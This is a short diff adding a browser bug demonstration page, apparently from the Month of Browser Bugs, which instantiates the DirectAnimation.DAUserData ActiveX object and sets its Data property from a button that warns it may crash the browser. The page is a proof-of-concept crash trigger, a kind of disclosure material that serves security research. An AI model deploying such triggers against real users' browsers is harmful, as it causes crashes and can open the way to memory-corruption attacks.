@@ -1,0 +1,10 @@
+// MoBB Demonstration
+function Demo() {
+	var a = new ActiveXObject('DirectAnimation.DAUserData');
+	a.Data = 'Hello';
+}
+
+</script>
+
+Clicking the button below may crash your browser!<br><br>
+<input type='button' onClick='Demo()' value='Start Demo!'>
